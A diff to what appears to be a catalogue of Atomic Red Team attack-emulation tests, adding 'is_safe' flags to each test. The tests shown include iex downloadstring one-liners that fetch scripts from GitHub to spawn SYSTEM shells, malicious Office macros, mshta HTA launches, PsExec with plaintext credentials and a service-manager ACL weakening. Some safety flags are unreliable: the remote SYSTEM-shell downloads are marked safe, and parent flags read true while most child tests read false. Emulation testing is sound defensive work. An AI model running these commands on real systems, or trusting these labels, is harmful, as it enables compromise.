       command: cscript "PathToAtomicsFolder\T1059.007\src\sys_info.js" > %tmp%\T1059.007.out.txt
       cleanup: del %tmp%\T1059.007.out.txt >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: JScript execution to gather local computer information via wscript
       type: cmd
       platform: windows
       command: wscript "PathToAtomicsFolder\T1059.007\src\sys_info.js"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1059/007
-  is_safe: false
+  is_safe: true
 - id: T1059.010
   name: AutoHotKey & AutoIT
   description: |-
@@ -936,9 +1029,10 @@
       platform: windows
       command: Start-Process -FilePath "$PathToAtomicsFolder\..\ExternalPayloads\ahk\AutoHotKeyU64.exe" -ArgumentList "PathToAtomicsFolder\T1059.010\src\calc.ahk"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1059/010
-  is_safe: false
+  is_safe: true
 - id: T1072
   name: Software Deployment Tools
   description: 'Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment ...'
@@ -957,12 +1051,14 @@
       command: '"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe"'
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: PDQ Deploy RAT
       type: cmd
       platform: windows
       command: '"%PROGRAMFILES(x86)%/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe"'
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Deploy 7-Zip Using Chocolatey
       type: powershell
       platform: windows
@@ -970,9 +1066,10 @@
         # Deploy 7-Zip using Chocolatey
         choco install -y 7zip
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1072
-  is_safe: false
+  is_safe: true
 - id: T1106
   name: Native API
   description: 'Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations...'
@@ -989,30 +1086,35 @@
         C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"%tmp%\T1106.exe" /target:exe "PathToAtomicsFolder\T1106\src\CreateProcess.cs"
         %tmp%/T1106.exe
       timeout: 120
+      is_safe: true
     - name: WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
       type: powershell
       platform: windows
       command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
       timeout: 120
+      is_safe: true
     - name: WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique
       type: powershell
       platform: windows
       command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
       timeout: 120
+      is_safe: true
     - name: WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique
       type: powershell
       platform: windows
       command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
       timeout: 120
+      is_safe: true
     - name: Run Shellcode via Syscall in Go
       type: powershell
       platform: windows
       command: $PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
       cleanup: Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1106
-  is_safe: false
+  is_safe: true
 - id: T1129
   name: Shared Modules
   description: |-
@@ -1033,9 +1135,10 @@
         echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\..\atomics\T1129\src\esxi_vibinstall.txt"
       cleanup: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\..\atomics\T1129\src\esxi_vibremove.txt"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1129
-  is_safe: false
+  is_safe: true
 - id: T1204.002
   name: Malicious File
   description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg, and .iso.(C...
@@ -1055,6 +1158,7 @@
         Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
       cleanup: Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: OSTap Payload Download
       type: cmd
       platform: windows
@@ -1063,6 +1167,7 @@
         cscript //E:Jscript %TEMP%\OSTapGet.js
       cleanup: del %TEMP%\OSTapGet.js /F /Q >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Maldoc choice flags command execution
       type: powershell
       platform: windows
@@ -1072,6 +1177,7 @@
         $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
         Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
       timeout: 120
+      is_safe: true
     - name: OSTAP JS version
       type: powershell
       platform: windows
@@ -1081,6 +1187,7 @@
         $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`", vbNormalFocus)`n"
         Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
       timeout: 120
+      is_safe: true
     - name: Office launching .bat file from AppData
       type: powershell
       platform: windows
@@ -1093,6 +1200,7 @@
         Remove-Item $("$env:temp\art1204.bat") -ErrorAction Ignore
         Get-Process | Where-Object { $_.MainModule.FileName -like "*calculator*" } | Stop-Process
       timeout: 120
+      is_safe: true
     - name: Excel 4 Macro
       type: powershell
       platform: windows
@@ -1154,6 +1262,7 @@
         Remove-Item "$env:TEMP\atomic_redteam_x4m_exec.vbs" -ErrorAction Ignore
         Remove-Item "$env:TEMP\procexp.exe" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Headless Chrome code execution via VBA
       type: powershell
       platform: windows
@@ -1163,6 +1272,7 @@
         Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
       cleanup: Stop-Process -name mshta
       timeout: 120
+      is_safe: true
     - name: Potentially Unwanted Applications (PUA)
       type: powershell
       platform: windows
@@ -1173,6 +1283,7 @@
         Stop-Process -name PotentiallyUnwanted
         Remove-Item $env:TEMP/PotentiallyUnwanted.exe -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Office Generic Payload Download
       type: powershell
       platform: windows
@@ -1185,6 +1296,7 @@
         Invoke-MalDoc -macroCode $macroCode -officeProduct "Word"
       cleanup: Remove-Item "C:\Users\$env:username\Desktop\https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: LNK Payload Download
       type: powershell
       platform: windows
@@ -1200,6 +1312,7 @@
         Remove-Item $file1 -ErrorAction Ignore
         Remove-Item $file2 -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Mirror Blast Emulation
       type: powershell
       platform: windows
@@ -1209,12 +1322,14 @@
         & '.\Excel 2016.lnk' "PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm"
       cleanup: reg delete "HKCU\SOFTWARE\Microsoft\Office\16.0\Excel\Security" /v "VBAWarnings" /f
       timeout: 120
+      is_safe: true
     - name: ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell
       type: powershell
       platform: windows
       command: Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
       cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -ErrorAction SilentlyContinue
       timeout: 120
+      is_safe: true
     - name: Simulate Click-Fix via Downloaded BAT File
       type: powershell
       platform: windows
@@ -1232,9 +1347,10 @@
         }
         Remove-Item "$env:TEMP\click-fix.bat" -ErrorAction SilentlyContinue
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1204/002
-  is_safe: false
+  is_safe: true
 - id: T1559
   name: Inter-Process Communication
   description: "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through..."
@@ -1249,29 +1365,34 @@
       platform: windows
       command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 1'
       timeout: 120
+      is_safe: true
     - name: Cobalt Strike Lateral Movement (psexec_psh) pipe
       type: cmd
       platform: windows
       command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 2'
       timeout: 120
+      is_safe: true
     - name: Cobalt Strike SSH (postex_ssh) pipe
       type: cmd
       platform: windows
       command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 3'
       timeout: 120
+      is_safe: true
     - name: Cobalt Strike post-exploitation pipe (4.2 and later)
       type: cmd
       platform: windows
       command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 4'
       timeout: 120
+      is_safe: true
     - name: Cobalt Strike post-exploitation pipe (before 4.2)
       type: cmd
       platform: windows
       command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 5'
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1559
-  is_safe: false
+  is_safe: true
 - id: T1559.002
   name: Dynamic Data Exchange
   description: |-
@@ -1287,9 +1408,10 @@
       platform: windows
       command: start "$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1559/002
-  is_safe: false
+  is_safe: true
 - id: T1569.001
   name: Launchctl
   description: |-
@@ -1306,9 +1428,10 @@
       command: launchctl submit -l evil -- /System/Applications/Calculator.app/Contents/MacOS/Calculator
       cleanup: launchctl remove evil
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1569/001
-  is_safe: false
+  is_safe: true
 - id: T1569.002
   name: Service Execution
   description: |-
@@ -1329,12 +1452,14 @@
       cleanup: del C:\art-marker.txt >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Use PsExec to execute a command on a remote host
       type: cmd
       platform: windows
       command: '"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\localhost -i -u DOMAIN\Administrator -p P@ssw0rd1 -accepteula "C:\Windows\System32\calc.exe"'
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: BlackCat pre-encryption cmds with Lateral Movement
       type: powershell
       platform: windows
@@ -1342,11 +1467,13 @@
       cleanup: "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /f\ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\" \ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"\nrm $env:temp\\psexec.exe"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Use RemCom to execute a command on a remote host
       type: cmd
       platform: windows
       command: '"PathToAtomicsFolder\..\ExternalPayloads\remcom.exe" \\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe'
       timeout: 120
+      is_safe: true
     - name: Snake Malware Service Create
       type: cmd
       platform: windows
@@ -1354,18 +1481,21 @@
       cleanup: sc.exe delete "WerFaultSvc"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Modifying ACL of Service Control Manager via SDET
       type: cmd
       platform: windows
       command: sc.exe sdset scmanager D:(A;;KA;;;WD)
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Pipe Creation - PsExec Tool Execution From Suspicious Locations
       type: powershell
       platform: windows
       command: "cd C:\\Users\\Public\\Temp\\ \n.\\PsExec.exe -i -s cmd  -accepteula"
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1569/002
-  is_safe: false
+  is_safe: true
